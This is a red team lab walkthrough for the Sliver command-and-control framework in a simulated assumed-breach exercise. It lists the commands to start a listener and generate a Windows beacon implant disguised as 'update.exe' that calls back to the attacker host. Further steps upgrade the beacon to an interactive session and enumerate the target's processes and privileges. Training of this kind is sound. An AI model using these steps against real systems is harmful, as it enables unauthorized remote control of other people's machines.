# Practical Lab: Sliver Command and Control

## Scenario
You are engaged in an assumed-breach red team exercise. You need to establish a robust Command and Control (C2) channel using Sliver to maintain access to a compromised Windows workstation and perform initial discovery.

## Objectives
1.  Start a Sliver server and configure an HTTP listener.
2.  Generate a Windows executable implant designed to beacon back to your server.
3.  Deploy and execute the implant on the target machine (simulated).
4.  Interact with the beacon, convert it to an interactive session, and perform basic enumeration.

## Lab Environment
*   **Attacker Machine:** Kali Linux (IP: 10.10.10.5)
*   **Target Machine:** Windows 10 (IP: 10.10.10.20)

## Walkthrough

### Phase 1: Setup and Generation
1.  Launch the Sliver server: `sliver-server`
2.  Start an HTTP listener: `http`
3.  Verify the listener is running: `jobs`
4.  Generate an HTTP beacon payload for Windows: 
    `generate --http 10.10.10.5:80 --os windows --arch amd64 --save /tmp/update.exe`

### Phase 2: Deployment (Simulated)
1.  Transfer `/tmp/update.exe` to the target Windows machine (e.g., via a simple python web server).
2.  Execute `update.exe` on the Windows machine.

### Phase 3: Interaction and Enumeration
1.  In the Sliver console, check for active beacons: `beacons`
2.  Note the ID of the new beacon.
3.  Interact with the beacon: `use <beacon_id>`
4.  Gather initial system information: `info`
5.  List running processes to identify potential injection targets or security products: `ps`
6.  Upgrade the beacon to an interactive session: `interactive`
7.  Check active sessions: `sessions`
8.  Interact with the new session: `use <session_id>`
9.  Run a basic discovery command: `shell whoami /all`
